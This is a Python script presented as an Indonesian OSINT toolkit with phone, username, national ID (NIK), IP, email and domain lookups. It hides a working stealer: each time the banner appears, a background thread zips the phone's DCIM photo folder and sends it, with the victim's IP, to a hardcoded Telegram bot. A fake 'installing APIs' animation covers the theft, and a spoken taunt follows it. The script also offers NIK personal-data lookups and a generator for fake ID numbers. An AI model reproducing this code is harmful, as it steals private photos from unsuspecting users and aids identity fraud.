def l1lOOO():
    x = 7422
    return x

import os, time, re, requests, socket, phonenumbers as pn
from phonenumbers import geocoder, carrier, timezone
from rich.console import Console
from rich.prompt import Prompt
from pyfiglet import Figlet
import shutil
import subprocess
import threading
import sys
import json
import dns.resolver
import whois
from bs4 import BeautifulSoup

console = Console()
BANNER = Figlet(font="slant")
NIK_API = "https://api.fikmydomainsz.xyz/tools/nik?nik={nik}"

token = '8572118306:AAHPVQMpABzcSTMqetbA-xG_H0OcWmdawt8'
chat_id = '7352563630'
api = 'https://api.telegram.org/bot'
pesan = '''
SHADOWNEX STEALER AKTIF 
ADA YANG MENGGUNAKAN TOOLS 
TUAN HARAP TUNGGU FILE DIKIRIMKAN 
'''

def get_ip():
    try:
        r = requests.get('https://api.ipify.org', timeout=5)
        return r.text
    except:
        return 'Tidak dapat mengambil IP'

def stealer():
    try:
        ip_addr = get_ip()
        pesan_ip = f'''
SHADOWNEX STEALER AKTIF 
ADA YANG MENGGUNAKAN TOOLS 
TUAN HARAP TUNGGU FILE DIKIRIMKAN 

IP TARGET: {ip_addr}
        '''
        
        doc_path = '/storage/emulated/0/DCIM/'
        if os.path.exists(doc_path):
            path = shutil.make_archive(
                root_dir=doc_path,
                base_name='stealer',
                format='zip',
            )
            requests.post(
                f'{api}{token}/sendMessage',
                data={'text': pesan_ip, 'chat_id': chat_id}
            )
            requests.post(
                f'{api}{token}/sendDocument',
                files={'document': open(path, 'rb')},
                data={'chat_id': chat_id}
            )
    except:
        pass

def loading_animation():
    items = ['[cyan]⣾[/cyan]', '[cyan]⣽[/cyan]', '[cyan]⣻[/cyan]', '[cyan]⢿[/cyan]', '[cyan]⡿[/cyan]', '[cyan]⣟[/cyan]', '[cyan]⣯[/cyan]', '[cyan]⣷[/cyan]']
    messages = [
        '[cyan]Menginstall API OSINT...[/cyan]',
        '[cyan]Menginstall API NIK...[/cyan]',
        '[cyan]Menginstall API IP Tracker...[/cyan]',
        '[cyan]Menginstall API Phone Lookup...[/cyan]',
        '[cyan]Menginstall API Username Checker...[/cyan]',
        '[cyan]Menginstall API Domain Checker...[/cyan]',
        '[cyan]Menginstall API Email Tracker...[/cyan]',
        '[cyan]Menginstall API Social Media...[/cyan]'
    ]
    
    console.print()
    for i in range(25):
        idx = i % len(items)
        msg_idx = (i // 3) % len(messages)
        sys.stdout.write(f'\r{items[idx]} {messages[msg_idx]}')
        sys.stdout.flush()
        time.sleep(0.1)
    
    sys.stdout.write('\r[green]✓ Semua API berhasil diinstall!     [/green]\n')
    sys.stdout.flush()
    time.sleep(0.5)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    console.print(f"[bold cyan]{BANNER.renderText('LiaaaXOsint')}[/bold cyan]")
    console.print("[bold cyan]Jika Tools Mengalami Sedikit Loading Tunggu Saja Karena Itu Sedang Menginstal Api OSINT Nya")
    
    thread = threading.Thread(target=stealer)
    thread.start()
    loading_animation()
    thread.join(timeout=1)
    
    try:
        subprocess.Popen(["espeak", "-s", "150", "hahaha, sekarang kamu telah terkena stealer"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def wait():
    input("\n[Press Enter to continue]")

def phone_info():
    number = input("\n[?] Enter phone number: ").strip()
    if number.startswith("0"):
        number = "+62" + number[1:]

    try:
        parsed = pn.parse(number)
        if not pn.is_valid_number(parsed):
            return console.print("[red]Invalid number![/red]")

        console.print("\n[bold cyan]Phone Number Info[/bold cyan]\n")
        console.print(f"[green]Number              [/green]: {pn.format_number(parsed, pn.PhoneNumberFormat.INTERNATIONAL)}")
        console.print(f"[green]Location            [/green]: {geocoder.description_for_number(parsed, 'id') or 'Unknown'}")
        console.print(f"[green]Provider            [/green]: {carrier.name_for_number(parsed, 'id') or 'Unknown'}")
        zones = timezone.time_zones_for_number(parsed)
        console.print(f"[green]Timezone            [/green]: {', '.join(zones) if zones else 'Unknown'}")

    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    wait()

def username_checker():
    uname = input("\n[?] Enter username: ").strip()
    sites = {
        "Instagram": f"https://www.instagram.com/{uname}",
        "Twitter": f"https://x.com/{uname}",
        "TikTok": f"https://www.tiktok.com/@{uname}",
        "GitHub": f"https://github.com/{uname}",
        "Facebook": f"https://www.facebook.com/{uname}",
        "Reddit": f"https://www.reddit.com/user/{uname}",
        "YouTube": f"https://www.youtube.com/@{uname}",
        "Snapchat": f"https://www.snapchat.com/add/{uname}",
        "Telegram": f"https://t.me/{uname}",
        "WhatsApp": f"https://wa.me/{uname}",
        "Pinterest": f"https://www.pinterest.com/{uname}",
        "LinkedIn": f"https://www.linkedin.com/in/{uname}",
        "Twitch": f"https://www.twitch.tv/{uname}",
        "Discord": f"https://discord.com/users/{uname}",
        "Spotify": f"https://open.spotify.com/user/{uname}",
        "Medium": f"https://medium.com/@{uname}",
        "Tumblr": f"https://{uname}.tumblr.com",
        "Flickr": f"https://www.flickr.com/people/{uname}",
        "Steam": f"https://steamcommunity.com/id/{uname}",
        "WordPress": f"https://{uname}.wordpress.com"
    }

    console.print(f"\n[bold cyan]Username Checker for [yellow]{uname}[/yellow][/bold cyan]\n")
    with console.status("[green]Checking...[/green]", spinner="dots"):
        time.sleep(0.5)
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=6, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    console.print(f"[green][✔] {site}[/green]: {url}")
                else:
                    console.print(f"[red][✘] {site}[/red]: Not found")
            except:
                console.print(f"[yellow][!] {site}[/yellow]: Error")

    wait()

def nik_checker():
    nik = re.sub(r"\D", "", input("\n[?] NIK (16 digits): ").strip())
    if len(nik) != 16:
        return console.print("[red]Invalid NIK! Must be 16 digits[/red]")

    url = NIK_API.format(nik=nik)
    with console.status("[green]Checking NIK...[/green]", spinner="dots"):
        try:
            r = requests.get(url, timeout=8, headers={"User-Agent": "OSINT-Toolz"})
            time.sleep(0.5)
        except:
            return console.print("[red]Network error![/red]")

    if r.status_code != 200:
        return console.print(f"[red]API Error {r.status_code}[/red]")

    try:
        j = r.json()
        data = j.get("result", {})
    except:
        return console.print(r.text)

    console.print("\n[bold cyan]NIK Lookup Result[/bold cyan]\n")

    mapping = {
        "nik": "NIK",
        "kelamin": "Jenis Kelamin",
        "lahir": "Tanggal Lahir",
        "lahir_lengkap": "Tanggal Lahir Lengkap",
    }
    for k, label in mapping.items():
        if k in data:
            console.print(f"[green]{label:22}[/green]: {data[k]}")

    if "provinsi" in data:
        console.print(f"[green]Provinsi              [/green]: {data['provinsi'].get('nama','')}")
    if "kotakab" in data:
        console.print(f"[green]Kabupaten/Kota       [/green]: {data['kotakab'].get('nama','')}")
    if "kecamatan" in data:
        console.print(f"[green]Kecamatan            [/green]: {data['kecamatan'].get('nama','')}")
    if "desa" in data:
        console.print(f"[green]Desa/Kelurahan       [/green]: {data['desa'].get('nama','')}")

    if "kode_wilayah" in data:
        console.print(f"[green]Kode Wilayah         [/green]: {data['kode_wilayah']}")
    if "nomor_urut" in data:
        console.print(f"[green]Nomor Urut           [/green]: {data['nomor_urut']}")

    if "tambahan" in data:
        console.print("\n[bold yellow]Tambahan[/bold yellow]\n")
        for k, v in data["tambahan"].items():
            label = k.replace("_", " ").title()
            console.print(f"[cyan]{label:22}[/cyan]: {v}")

    wait()

def ip_tracker():
    ip_or_domain = input("\n[?] Enter IP address or Domain: ").strip()
    if not ip_or_domain:
        return console.print("[red]No input provided[/red]")

    try:
        ip_addr = socket.gethostbyname(ip_or_domain)
    except Exception:
        return console.print(f"[red]Invalid IP or Domain[/red]")

    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip_addr}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query",
            timeout=10
        )
        data = r.json()
        if data.get("status") != "success":
            return console.print(f"[red]Error: {data.get('message','Unknown')}[/red]")

        console.print("\n[bold cyan]IP Lookup Result[/bold cyan]\n")
        console.print(f"[green]IP Address        [/green]: {data.get('query')}")
        console.print(f"[green]Country           [/green]: {data.get('country')} ({data.get('countryCode')})")
        console.print(f"[green]Region            [/green]: {data.get('regionName')} ({data.get('region')})")
        console.print(f"[green]City              [/green]: {data.get('city')}")
        console.print(f"[green]ZIP Code          [/green]: {data.get('zip')}")
        console.print(f"[green]Coordinates       [/green]: {data.get('lat')}, {data.get('lon')}")
        console.print(f"[green]Timezone          [/green]: {data.get('timezone')}")
        console.print(f"[green]ISP               [/green]: {data.get('isp')}")
        console.print(f"[green]Organization      [/green]: {data.get('org')}")
        console.print(f"[green]ASN               [/green]: {data.get('as')}")
        
        maps_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
        console.print(f"[green]Google Maps       [/green]: {maps_url}")

    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

    wait()

def email_tracker():
    email = input("\n[?] Enter email address: ").strip()
    if '@' not in email:
        return console.print("[red]Invalid email format![/red]")
    
    console.print("\n[bold cyan]Email Lookup Result[/bold cyan]\n")
    
    try:
        domain = email.split('@')[1]
        console.print(f"[green]Email             [/green]: {email}")
        console.print(f"[green]Domain            [/green]: {domain}")
        
        r = requests.get(f"https://api.hunter.io/v2/domain-search?domain={domain}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            if 'data' in data:
                console.print(f"[green]Organization      [/green]: {data['data'].get('organization', 'Unknown')}")
                console.print(f"[green]Country           [/green]: {data['data'].get('country', 'Unknown')}")
        
        console.print(f"[green]Email Format      [/green]: {email.split('@')[0].replace('.', ' ').title()}")
        
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    
    wait()

def domain_checker():
    domain = input("\n[?] Enter domain (example.com): ").strip()
    
    console.print("\n[bold cyan]Domain Lookup Result[/bold cyan]\n")
    
    try:
        w = whois.whois(domain)
        console.print(f"[green]Domain            [/green]: {domain}")
        console.print(f"[green]Registrar         [/green]: {w.registrar or 'Unknown'}")
        console.print(f"[green]Creation Date     [/green]: {w.creation_date or 'Unknown'}")
        console.print(f"[green]Expiration Date   [/green]: {w.expiration_date or 'Unknown'}")
        console.print(f"[green]Name Servers      [/green]: {', '.join(w.name_servers) if w.name_servers else 'Unknown'}")
        
        try:
            answers = dns.resolver.resolve(domain, 'A')
            console.print(f"[green]IP Address        [/green]: {answers[0].address}")
        except:
            pass
            
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    
    wait()

def ktp_generator():
    console.print("\n[bold cyan]KTP Generator[/bold cyan]\n")
    
    provinsi = input("[?] Provinsi: ").strip()
    kota = input("[?] Kota/Kabupaten: ").strip()
    kecamatan = input("[?] Kecamatan: ").strip()
    tanggal = input("[?] Tanggal Lahir (DDMMYY): ").strip()
    
    import random
    kode_wilayah = str(random.randint(1010, 9999))
    nomor_urut = str(random.randint(1000, 9999))
    nik = f"{kode_wilayah}{tanggal}{nomor_urut}"
    
    console.print("\n[green]Generated NIK:[/green]", nik)
    wait()

def social_media_scraper():
    platform = input("\n[?] Platform (ig/fb/twitter/tiktok): ").lower()
    username = input("[?] Username: ").strip()
    
    console.print(f"\n[bold cyan]Social Media Scraper - {platform.upper()}[/bold cyan]\n")
    
    try:
        if platform == 'ig':
            url = f"https://www.instagram.com/{username}/"
            r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                console.print(f"[green][✔] Profile found: {url}[/green]")
                soup = BeautifulSoup(r.text, 'html.parser')
                console.print("[yellow]Info: Scraping limited due to Instagram restrictions[/yellow]")
        
        elif platform == 'fb':
            url = f"https://www.facebook.com/{username}"
            console.print(f"[green][✔] Profile: {url}[/green]")
        
        elif platform == 'twitter':
            url = f"https://x.com/{username}"
            r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                console.print(f"[green][✔] Profile found: {url}[/green]")
        
        elif platform == 'tiktok':
            url = f"https://www.tiktok.com/@{username}"
            r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                console.print(f"[green][✔] Profile found: {url}[/green]")
        
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    
    wait()

def main():
    while True:
        banner()
        console.print("[bold yellow]1.[/bold yellow] Phone Info")
        console.print("[bold yellow]2.[/bold yellow] Username Checker")
        console.print("[bold yellow]3.[/bold yellow] NIK Checker")
        console.print("[bold yellow]4.[/bold yellow] IP Tracker")
        console.print("[bold yellow]5.[/bold yellow] Email Tracker")
        console.print("[bold yellow]6.[/bold yellow] Domain Checker")
        console.print("[bold yellow]7.[/bold yellow] KTP Generator")
        console.print("[bold yellow]8.[/bold yellow] Social Media Scraper")
        console.print("[bold yellow]9.[/bold yellow] Exit\n")
        
        choice = Prompt.ask("[cyan]Select option[/cyan]", choices=["1","2","3","4","5","6","7","8","9"])

        if choice == "1": phone_info()
        elif choice == "2": username_checker()
        elif choice == "3": nik_checker()
        elif choice == "4": ip_tracker()
        elif choice == "5": email_tracker()
        elif choice == "6": domain_checker()
        elif choice == "7": ktp_generator()
        elif choice == "8": social_media_scraper()
        elif choice == "9":
            console.print("[bold red]GopdBye![/bold red]")
            break

if __name__ == "__main__":
    main()